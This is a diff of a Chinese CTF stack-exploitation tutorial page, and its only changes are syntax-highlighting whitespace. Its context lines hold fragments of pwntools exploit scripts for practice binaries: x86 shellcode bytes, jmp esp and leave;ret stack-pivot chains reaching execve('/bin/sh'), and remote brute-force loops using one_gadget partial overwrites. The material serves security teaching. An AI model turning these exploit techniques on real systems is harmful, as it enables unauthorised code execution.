@@ -45,7 +45,7 @@ Unique<span class=w> </span>gadgets<span class=w> </span>found:<span class=w> </
 </code></pre></div> <p>这里我们发现有一个可以直接跳转到 esp 的 gadgets。那么我们可以布置 payload 如下</p> <div class=highlight><pre><span></span><code>shellcode|padding|fake ebp|0x08048504|set esp point to shellcode and jmp esp
 </code></pre></div> <p>那么我们 payload 中的最后一部分改如何设置 esp 呢，可以知道</p> <ul> <li>size(shellcode+padding)=0x20</li> <li>size(fake ebp)=0x4</li> <li>size(0x08048504)=0x4</li> </ul> <p>所以我们最后一段需要执行的指令就是</p> <div class=highlight><pre><span></span><code><span class=nf>sub</span><span class=w> </span><span class=no>esp</span><span class=p>,</span><span class=mi>0x28</span>
 <span class=nf>jmp</span><span class=w> </span><span class=no>esp</span>
-</code></pre></div> <p>所以最后的 exp 如下</p> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</code></pre></div> <p>所以最后的 exp 如下</p> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
 <span class=n>sh</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./b0verfl0w&#39;</span><span class=p>)</span>
 
 <span class=n>shellcode_x86</span> <span class=o>=</span> <span class=s2>&quot;</span><span class=se>\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73</span><span class=s2>&quot;</span>
@@ -151,10 +151,10 @@ ebp2|leave ret addr|arg1|arg2
 <span class=mi>0</span><span class=n>e</span><span class=o>:</span><span class=mo>0070</span><span class=err>│</span><span class=w>                  </span><span class=mh>0x7ffceaf111d0</span><span class=w> </span><span class=err>—▸</span><span class=w> </span><span class=mh>0x400730</span><span class=w> </span><span class=err>◂—</span><span class=w> </span><span class=n>push</span><span class=w>   </span><span class=n>r15</span>
 <span class=n>pwndbg</span><span class=o>&gt;</span><span class=w> </span><span class=n>distance</span><span class=w> </span><span class=mh>0x7ffceaf111d0</span><span class=w> </span><span class=mh>0x7ffceaf11160</span>
 <span class=mh>0x7ffceaf111d0</span><span class=o>-&gt;</span><span class=mh>0x7ffceaf11160</span><span class=w> </span><span class=n>is</span><span class=w> </span><span class=mh>-0x70</span><span class=w> </span><span class=n>bytes</span><span class=w> </span><span class=p>(</span><span class=mh>-0xe</span><span class=w> </span><span class=n>words</span><span class=p>)</span>
-</code></pre></div></p> <p>leak 出栈地址后, 我们就可以通过控制 rbp 为栈上的地址(如 0x7ffceaf11160), ret addr 为 leave ret 的地址来实现控制程序流程了。 </p> <p>比如我们可以在 0x7ffceaf11160 + 0x8 填上 leak libc 的 rop chain 并控制其返回到 <code>sub_400676</code> 函数来 leak libc。 ​ <br> 然后在下一次利用时就可以通过 rop 执行 <code>system("/bin/sh")</code> 或 <code>execve("/bin/sh", 0, 0)</code> 来 get shell 了, 这道题目因为输入的长度足够, 我们可以布置调用 <code>execve("/bin/sh", 0, 0)</code> 的利用链, 这种方法更稳妥(<code>system("/bin/sh")</code> 可能会因为 env 被破坏而失效), 不过由于利用过程中栈的结构会发生变化, 所以一些关键的偏移还需要通过调试来确定</p> <h4 id=exp>exp<a class=headerlink href=#exp title="Permanent link">&para;</a></h4> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</code></pre></div></p> <p>leak 出栈地址后, 我们就可以通过控制 rbp 为栈上的地址(如 0x7ffceaf11160), ret addr 为 leave ret 的地址来实现控制程序流程了。 </p> <p>比如我们可以在 0x7ffceaf11160 + 0x8 填上 leak libc 的 rop chain 并控制其返回到 <code>sub_400676</code> 函数来 leak libc。 ​ <br> 然后在下一次利用时就可以通过 rop 执行 <code>system("/bin/sh")</code> 或 <code>execve("/bin/sh", 0, 0)</code> 来 get shell 了, 这道题目因为输入的长度足够, 我们可以布置调用 <code>execve("/bin/sh", 0, 0)</code> 的利用链, 这种方法更稳妥(<code>system("/bin/sh")</code> 可能会因为 env 被破坏而失效), 不过由于利用过程中栈的结构会发生变化, 所以一些关键的偏移还需要通过调试来确定</p> <h4 id=exp>exp<a class=headerlink href=#exp title="Permanent link">&para;</a></h4> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
 <span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=s2>&quot;./over.over&quot;</span>
 
-<span class=k>def</span> <span class=nf>DEBUG</span><span class=p>(</span><span class=n>cmd</span><span class=p>):</span>
+<span class=k>def</span><span class=w> </span><span class=nf>DEBUG</span><span class=p>(</span><span class=n>cmd</span><span class=p>):</span>
     <span class=n>raw_input</span><span class=p>(</span><span class=s2>&quot;DEBUG: &quot;</span><span class=p>)</span>
     <span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>io</span><span class=p>,</span> <span class=n>cmd</span><span class=p>)</span>
 
@@ -372,7 +372,7 @@ ebp2|leave ret addr|arg1|arg2
 <span class=mi>536</span>
 <span class=o>&gt;&gt;&gt;</span> <span class=nb>hex</span><span class=p>(</span><span class=mi>536</span><span class=p>)</span>
 <span class=s1>&#39;0x218&#39;</span>
-</code></pre></div> <h4 id=_13>利用程序<a class=headerlink href=#_13 title="Permanent link">&para;</a></h4> <p>我们构造利用程序如下</p> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</code></pre></div> <h4 id=_13>利用程序<a class=headerlink href=#_13 title="Permanent link">&para;</a></h4> <p>我们构造利用程序如下</p> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
 <span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span>
 <span class=n>smash</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./smashes&#39;</span><span class=p>)</span>
 <span class=k>if</span> <span class=n>args</span><span class=p>[</span><span class=s1>&#39;REMOTE&#39;</span><span class=p>]:</span>
@@ -524,7 +524,7 @@ ebp2|leave ret addr|arg1|arg2
 </code></pre></div> 可以发现, 此时的返回地址与 get shell 函数的地址只有低位的 8 bit 不同, 如果覆写低 8 bit 为 <code>0x?A3E</code>, 就有一定的几率 get shell</p> <p>最终的脚本如下: <div class=highlight><pre><span></span><code><span class=ch>#!/usr/bin/env python</span>
 <span class=c1># -*- coding: utf-8 -*-</span>
 
-<span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+<span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
 <span class=c1>#  context.log_level = &quot;debug&quot;</span>
 <span class=n>context</span><span class=o>.</span><span class=n>terminal</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&quot;deepin-terminal&quot;</span><span class=p>,</span> <span class=s2>&quot;-x&quot;</span><span class=p>,</span> <span class=s2>&quot;sh&quot;</span><span class=p>,</span> <span class=s2>&quot;-c&quot;</span><span class=p>]</span>
 
@@ -584,7 +584,7 @@ ebp2|leave ret addr|arg1|arg2
 0x7ffff7dd3000     0x7ffff7dd7000 rw-p     4000 0
 0x7ffff7dd7000     0x7ffff7dfd000 r-xp    26000 0      /lib/x86_64-linux-gnu/ld-2.23.so
 </code></pre></div> <p>一个比较自然的想法就是我们通过 partial overwrite 来修改这两个地址到某个获取 shell 的位置，那自然就是 Onegadget 了。那么我们究竟覆盖哪一个呢？？</p> <p>我们先来分析一下 <code>libc</code> 的基地址 <code>0x7ffff7a0d000</code>。我们一般要覆盖字节的话，至少要覆盖1个半字节才能够获取跳到 onegadget。然而，程序中读取的时候是 <code>gets</code>读取的，也就意味着字符串的末尾肯定会存在<code>\x00</code>。</p> <p>而我们覆盖字节的时候必须覆盖整数倍个数，即至少会覆盖 3 个字节，而我们再来看看<code>__libc_start_main+240</code> 的地址 <code>0x7ffff7a2d830</code>，如果覆盖3个字节，那么就是 <code>0x7ffff700xxxx</code>，已经小于了 libc 的基地址了，前面也没有刻意执行的代码位置。</p> <p>一般来说 libc_start_main 在 libc 中的偏移不会差的太多，那么显然我们如果覆盖 <code>__libc_start_main+240</code> ，显然是不可能的。</p> <p>而 ld 的基地址呢？如果我们覆盖了栈上<code>_dl_init+139</code>，即为<code>0x7ffff700xxxx</code>。而观察上述的内存布局，我们可以发现<code>libc</code>位于 <code>ld</code> 的低地址方向，那么在随机化的时候，很有可能 libc 的第 3 个字节是为<code>\x00</code> 的。</p> <p>举个例子，目前两者之间的偏移为</p> <div class=highlight><pre><span></span><code>0x7ffff7dd7000-0x7ffff7a0d000=0x3ca000
-</code></pre></div> <p>那么如果 ld 被加载到了 <code>0x7ffff73ca000</code>，则显然 <code>libc</code> 的起始地址就是<code>0x7ffff7000000</code>。</p> <p>因此，我们有足够的理由选择覆盖栈上存储的<code>_dl_init+139</code>。那么覆盖成什么呢？还不知道。因为我们还不知道 libc 的库版本是什么，，</p> <p>我们可以先随便覆盖覆盖，看看程序会不会崩溃，毕竟此时很有可能会执行 libc 库中的代码。</p> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</code></pre></div> <p>那么如果 ld 被加载到了 <code>0x7ffff73ca000</code>，则显然 <code>libc</code> 的起始地址就是<code>0x7ffff7000000</code>。</p> <p>因此，我们有足够的理由选择覆盖栈上存储的<code>_dl_init+139</code>。那么覆盖成什么呢？还不知道。因为我们还不知道 libc 的库版本是什么，，</p> <p>我们可以先随便覆盖覆盖，看看程序会不会崩溃，毕竟此时很有可能会执行 libc 库中的代码。</p> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
 <span class=n>context</span><span class=o>.</span><span class=n>terminal</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;tmux&#39;</span><span class=p>,</span> <span class=s1>&#39;split&#39;</span><span class=p>,</span> <span class=s1>&#39;-h&#39;</span><span class=p>]</span>
 <span class=c1>#context.terminal = [&#39;gnome-terminal&#39;, &#39;-x&#39;, &#39;sh&#39;, &#39;-c&#39;]</span>
 <span class=k>if</span> <span class=n>args</span><span class=p>[</span><span class=s1>&#39;DEBUG&#39;</span><span class=p>]:</span>
@@ -596,7 +596,7 @@ ebp2|leave ret addr|arg1|arg2
 <span class=n>bits</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>bits</span>
 
 
-<span class=k>def</span> <span class=nf>exp</span><span class=p>(</span><span class=n>ip</span><span class=p>,</span> <span class=n>port</span><span class=p>):</span>
+<span class=k>def</span><span class=w> </span><span class=nf>exp</span><span class=p>(</span><span class=n>ip</span><span class=p>,</span> <span class=n>port</span><span class=p>):</span>
     <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mh>0x1000</span><span class=p>):</span>
         <span class=k>if</span> <span class=n>args</span><span class=p>[</span><span class=s1>&#39;REMOTE&#39;</span><span class=p>]:</span>
             <span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>ip</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
@@ -667,7 +667,7 @@ constraints:
 0xf1147<span class=w> </span>execve<span class=o>(</span><span class=s2>&quot;/bin/sh&quot;</span>,<span class=w> </span>rsp+0x70,<span class=w> </span>environ<span class=o>)</span>
 constraints:
 <span class=w>  </span><span class=o>[</span>rsp+0x70<span class=o>]</span><span class=w> </span><span class=o>==</span><span class=w> </span>NULL
-</code></pre></div> <p>使用如下 exp 继续爆破，</p> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</code></pre></div> <p>使用如下 exp 继续爆破，</p> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
 <span class=n>context</span><span class=o>.</span><span class=n>terminal</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;tmux&#39;</span><span class=p>,</span> <span class=s1>&#39;split&#39;</span><span class=p>,</span> <span class=s1>&#39;-h&#39;</span><span class=p>]</span>
 <span class=c1>#context.terminal = [&#39;gnome-terminal&#39;, &#39;-x&#39;, &#39;sh&#39;, &#39;-c&#39;]</span>
 <span class=k>if</span> <span class=n>args</span><span class=p>[</span><span class=s1>&#39;DEBUG&#39;</span><span class=p>]:</span>
@@ -679,7 +679,7 @@ constraints:
 <span class=n>bits</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>bits</span>
 
 
-<span class=k>def</span> <span class=nf>exp</span><span class=p>(</span><span class=n>ip</span><span class=p>,</span> <span class=n>port</span><span class=p>):</span>
+<span class=k>def</span><span class=w> </span><span class=nf>exp</span><span class=p>(</span><span class=n>ip</span><span class=p>,</span> <span class=n>port</span><span class=p>):</span>
     <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mh>0x1000</span><span class=p>):</span>
         <span class=k>if</span> <span class=n>args</span><span class=p>[</span><span class=s1>&#39;REMOTE&#39;</span><span class=p>]:</span>
             <span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>ip</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
